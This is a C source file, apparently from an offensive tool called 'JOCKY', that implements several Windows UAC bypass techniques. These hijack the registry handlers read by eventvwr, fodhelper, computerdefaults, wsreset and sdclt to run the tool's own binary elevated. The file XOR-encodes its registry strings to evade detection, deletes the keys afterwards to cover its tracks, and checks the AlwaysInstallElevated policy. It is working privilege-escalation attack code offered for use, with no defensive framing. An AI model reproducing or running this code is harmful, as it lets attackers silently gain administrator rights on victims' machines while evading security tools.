#include "uac_bypass.h"
#include <shellapi.h>
#include <string.h>
#include <stdio.h>

#define KEY 0x3A

/* Magic exit code the elevated child returns so the parent can confirm
 * the binary actually ran (not just that the auto-elevate proc launched). */
#define CHILD_RAN_CODE 0xCAFE

static void decode_str(char *out, const unsigned char *enc, int len) {
    for (int i = 0; i < len; i++) out[i] = (char)(enc[i] ^ KEY);
    out[len] = 0;
}

/* XOR-encoded registry keys — plaintext strings never appear in binary. */

/* "Software\Classes\ms-settings\shell\open\command" */
static const unsigned char ENC_MS_SETTINGS[] = {
    0x69, 0x55, 0x5C, 0x4E, 0x4D, 0x5B, 0x48, 0x5F, 0x66, 0x79, 0x56, 0x5B,
    0x49, 0x49, 0x5F, 0x49, 0x66, 0x57, 0x49, 0x17, 0x49, 0x5F, 0x4E, 0x4E,
    0x53, 0x54, 0x5D, 0x49, 0x66, 0x49, 0x52, 0x5F, 0x56, 0x56, 0x66, 0x55,
    0x4A, 0x5F, 0x54, 0x66, 0x59, 0x55, 0x57, 0x57, 0x5B, 0x54, 0x5E
};
/* "Software\Classes\mscfile\shell\open\command" */
static const unsigned char ENC_MSCFILE[] = {
    0x69, 0x55, 0x5C, 0x4E, 0x4D, 0x5B, 0x48, 0x5F, 0x66, 0x79, 0x56, 0x5B,
    0x49, 0x49, 0x5F, 0x49, 0x66, 0x57, 0x49, 0x59, 0x5C, 0x53, 0x56, 0x5F,
    0x66, 0x49, 0x52, 0x5F, 0x56, 0x56, 0x66, 0x55, 0x4A, 0x5F, 0x54, 0x66,
    0x59, 0x55, 0x57, 0x57, 0x5B, 0x54, 0x5E
};
/* "Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command" */
static const unsigned char ENC_WSRESET[] = {
    0x69, 0x55, 0x5C, 0x4E, 0x4D, 0x5B, 0x48, 0x5F, 0x66, 0x79, 0x56, 0x5B,
    0x49, 0x49, 0x5F, 0x49, 0x66, 0x7B, 0x4A, 0x4A, 0x62, 0x02, 0x08, 0x5B,
    0x0C, 0x5D, 0x4D, 0x48, 0x5F, 0x0E, 0x5C, 0x5E, 0x5D, 0x09, 0x58, 0x4E,
    0x0C, 0x09, 0x0F, 0x4E, 0x54, 0x0F, 0x59, 0x4E, 0x4B, 0x50, 0x5C, 0x02,
    0x57, 0x49, 0x5E, 0x5E, 0x08, 0x66, 0x69, 0x52, 0x5F, 0x56, 0x56, 0x66,
    0x55, 0x4A, 0x5F, 0x54, 0x66, 0x59, 0x55, 0x57, 0x57, 0x5B, 0x54, 0x5E
};
/* "Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe" */
static const unsigned char ENC_SDCLT[] = {
    0x69, 0x55, 0x5C, 0x4E, 0x4D, 0x5B, 0x48, 0x5F, 0x66, 0x77, 0x53, 0x59,
    0x48, 0x55, 0x49, 0x55, 0x5C, 0x4E, 0x66, 0x6D, 0x53, 0x54, 0x5E, 0x55,
    0x4D, 0x49, 0x66, 0x79, 0x4F, 0x48, 0x48, 0x5F, 0x54, 0x4E, 0x6C, 0x5F,
    0x48, 0x49, 0x53, 0x55, 0x54, 0x66, 0x7B, 0x4A, 0x4A, 0x1A, 0x6A, 0x5B,
    0x4E, 0x52, 0x49, 0x66, 0x59, 0x55, 0x54, 0x4E, 0x48, 0x55, 0x56, 0x14,
    0x5F, 0x42, 0x5F
};

/*
 * Wait for an auto-elevate launcher to finish, then verify the elevated child
 * actually ran our binary by checking its exit code against CHILD_RAN_CODE.
 * Returns true only when the child confirmed it ran.
 */
static bool wait_and_verify(HANDLE hProcess, DWORD timeout_ms) {
    if (!hProcess) return false;
    DWORD wait = WaitForSingleObject(hProcess, timeout_ms);
    if (wait != WAIT_OBJECT_0) {
        CloseHandle(hProcess);
        return false;
    }
    DWORD exit_code = 0;
    BOOL got = GetExitCodeProcess(hProcess, &exit_code);
    CloseHandle(hProcess);
    /* CHILD_RAN_CODE confirms OUR binary ran elevated (set at entry of main) */
    return got && exit_code == CHILD_RAN_CODE;
}

/*
 * Technique 1: eventvwr.exe + mscfile handler hijack.
 * EventVwr is auto-elevate and reads HKCU\Software\Classes\mscfile\shell\open\command
 * to launch the .msc handler. Different behavioral signature from fodhelper/ms-settings.
 */
static bool bypass_eventvwr(const char *self_path) {
    char key[44]; decode_str(key, ENC_MSCFILE, sizeof(ENC_MSCFILE));

    HKEY hKey;
    if (RegCreateKeyExA(HKEY_CURRENT_USER, key, 0, NULL,
            REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) != ERROR_SUCCESS)
        return false;

    RegSetValueExA(hKey, NULL, 0, REG_SZ,
        (const BYTE*)self_path, (DWORD)(strlen(self_path) + 1));
    RegCloseKey(hKey);

    char proc_path[MAX_PATH];
    GetSystemDirectoryA(proc_path, MAX_PATH);
    /* eventvwr.exe — encoded: {0x5F,0x4C,0x5F,0x54,0x4E,0x4C,0x4D,0x48,0x14,0x5F,0x42,0x5F} */
    static const unsigned char ENC_EVENTVWR[] = {
        0x5F, 0x4C, 0x5F, 0x54, 0x4E, 0x4C, 0x4D, 0x48, 0x14, 0x5F, 0x42, 0x5F
    };
    char evw[13]; decode_str(evw, ENC_EVENTVWR, sizeof(ENC_EVENTVWR));
    strncat(proc_path, "\\", MAX_PATH - strlen(proc_path) - 1);
    strncat(proc_path, evw, MAX_PATH - strlen(proc_path) - 1);

    SHELLEXECUTEINFOA sei = {0};
    sei.cbSize = sizeof(sei);
    sei.fMask  = SEE_MASK_NOCLOSEPROCESS;
    sei.lpVerb = "open";
    sei.lpFile = proc_path;
    sei.nShow  = SW_HIDE;
    BOOL launched = ShellExecuteExA(&sei);

    /* Give eventvwr time to read registry and launch our binary */
    Sleep(2000);
    RegDeleteKeyA(HKEY_CURRENT_USER, key);

    return wait_and_verify(launched ? sei.hProcess : NULL, 28000);
}

/*
 * Technique 2: fodhelper + ms-settings (legacy — may be detected on patched systems).
 */
static bool bypass_fodhelper(const char *self_path) {
    char key[48]; decode_str(key, ENC_MS_SETTINGS, sizeof(ENC_MS_SETTINGS));

    HKEY hKey;
    if (RegCreateKeyExA(HKEY_CURRENT_USER, key, 0, NULL,
            REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) != ERROR_SUCCESS)
        return false;

    RegSetValueExA(hKey, NULL, 0, REG_SZ,
        (const BYTE*)self_path, (DWORD)(strlen(self_path) + 1));
    RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ, (const BYTE*)"", 1);
    RegCloseKey(hKey);

    char proc_path[MAX_PATH];
    GetSystemDirectoryA(proc_path, MAX_PATH);
    strncat(proc_path, "\\fodhelper.exe", MAX_PATH - strlen(proc_path) - 1);

    SHELLEXECUTEINFOA sei = {0};
    sei.cbSize = sizeof(sei);
    sei.fMask  = SEE_MASK_NOCLOSEPROCESS;
    sei.lpVerb = "open";
    sei.lpFile = proc_path;
    sei.nShow  = SW_SHOWNORMAL;
    BOOL launched = ShellExecuteExA(&sei);

    RegDeleteKeyA(HKEY_CURRENT_USER, key);
    return wait_and_verify(launched ? sei.hProcess : NULL, 30000);
}

/*
 * Technique 3: wsreset + AppX handler.
 */
static bool bypass_wsreset(const char *self_path) {
    char key[73]; decode_str(key, ENC_WSRESET, sizeof(ENC_WSRESET));

    HKEY hKey;
    if (RegCreateKeyExA(HKEY_CURRENT_USER, key, 0, NULL,
            REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) != ERROR_SUCCESS)
        return false;

    RegSetValueExA(hKey, NULL, 0, REG_SZ,
        (const BYTE*)self_path, (DWORD)(strlen(self_path) + 1));
    RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ, (const BYTE*)"", 1);
    RegCloseKey(hKey);

    char proc_path[MAX_PATH];
    GetSystemDirectoryA(proc_path, MAX_PATH);
    strncat(proc_path, "\\wsreset.exe", MAX_PATH - strlen(proc_path) - 1);

    SHELLEXECUTEINFOA sei = {0};
    sei.cbSize = sizeof(sei);
    sei.fMask  = SEE_MASK_NOCLOSEPROCESS;
    sei.lpVerb = "open";
    sei.lpFile = proc_path;
    sei.nShow  = SW_SHOWNORMAL;
    BOOL launched = ShellExecuteExA(&sei);

    RegDeleteKeyA(HKEY_CURRENT_USER, key);
    return wait_and_verify(launched ? sei.hProcess : NULL, 30000);
}

/*
 * Technique 4: sdclt /KickOffElev.
 */
static bool bypass_sdclt(const char *self_path) {
    char key[64]; decode_str(key, ENC_SDCLT, sizeof(ENC_SDCLT));

    HKEY hKey;
    if (RegCreateKeyExA(HKEY_CURRENT_USER, key, 0, NULL,
            REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) != ERROR_SUCCESS)
        return false;

    RegSetValueExA(hKey, NULL, 0, REG_SZ,
        (const BYTE*)self_path, (DWORD)(strlen(self_path) + 1));
    RegCloseKey(hKey);

    char proc_path[MAX_PATH];
    GetSystemDirectoryA(proc_path, MAX_PATH);
    strncat(proc_path, "\\sdclt.exe", MAX_PATH - strlen(proc_path) - 1);

    SHELLEXECUTEINFOA sei = {0};
    sei.cbSize       = sizeof(sei);
    sei.fMask        = SEE_MASK_NOCLOSEPROCESS;
    sei.lpVerb       = "open";
    sei.lpFile       = proc_path;
    sei.lpParameters = "/KickOffElev";
    sei.nShow        = SW_SHOWNORMAL;
    BOOL launched = ShellExecuteExA(&sei);

    RegDeleteKeyA(HKEY_CURRENT_USER, key);
    return wait_and_verify(launched ? sei.hProcess : NULL, 30000);
}

/* Public API wrappers (used by JOCKY prelude) */
bool jocky_uac_bypass_fodhelper(const char* self_path) {
    return bypass_fodhelper(self_path);
}
bool jocky_uac_bypass_computerdefaults(const char* self_path) {
    char key[48]; decode_str(key, ENC_MS_SETTINGS, sizeof(ENC_MS_SETTINGS));

    HKEY hKey;
    if (RegCreateKeyExA(HKEY_CURRENT_USER, key, 0, NULL,
            REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) != ERROR_SUCCESS)
        return false;
    RegSetValueExA(hKey, NULL, 0, REG_SZ,
        (const BYTE*)self_path, (DWORD)(strlen(self_path) + 1));
    RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ, (const BYTE*)"", 1);
    RegCloseKey(hKey);

    char proc_path[MAX_PATH];
    GetSystemDirectoryA(proc_path, MAX_PATH);
    strncat(proc_path, "\\computerdefaults.exe", MAX_PATH - strlen(proc_path) - 1);

    SHELLEXECUTEINFOA sei = {0};
    sei.cbSize = sizeof(sei);
    sei.fMask  = SEE_MASK_NOCLOSEPROCESS;
    sei.lpVerb = "open";
    sei.lpFile = proc_path;
    sei.nShow  = SW_SHOWNORMAL;
    BOOL launched = ShellExecuteExA(&sei);

    RegDeleteKeyA(HKEY_CURRENT_USER, key);
    return wait_and_verify(launched ? sei.hProcess : NULL, 30000);
}
bool jocky_uac_bypass_wsreset(const char* self_path) { return bypass_wsreset(self_path); }
bool jocky_uac_bypass_sdclt(const char* self_path)   { return bypass_sdclt(self_path);   }

bool jocky_check_always_install_elevated(void) {
    DWORD val = 0, size = sizeof(val);
    HKEY hKey;
    bool hklm_set = false, hkcu_set = false;

    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
            "SOFTWARE\\Policies\\Microsoft\\Windows\\Installer",
            0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        if (RegQueryValueExA(hKey, "AlwaysInstallElevated", NULL, NULL,
                (LPBYTE)&val, &size) == ERROR_SUCCESS && val == 1)
            hklm_set = true;
        RegCloseKey(hKey);
    }
    val = 0; size = sizeof(val);
    if (RegOpenKeyExA(HKEY_CURRENT_USER,
            "SOFTWARE\\Policies\\Microsoft\\Windows\\Installer",
            0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        if (RegQueryValueExA(hKey, "AlwaysInstallElevated", NULL, NULL,
                (LPBYTE)&val, &size) == ERROR_SUCCESS && val == 1)
            hkcu_set = true;
        RegCloseKey(hKey);
    }
    return hklm_set && hkcu_set;
}

bool jocky_uac_bypass(void) {
    char self_path[MAX_PATH];
    if (!GetModuleFileNameA(NULL, self_path, MAX_PATH))
        return false;

    if (jocky_uac_bypass_icmluautil(self_path))   return true;
    if (jocky_uac_bypass_silentcleanup(self_path)) return true;
    return false;
}
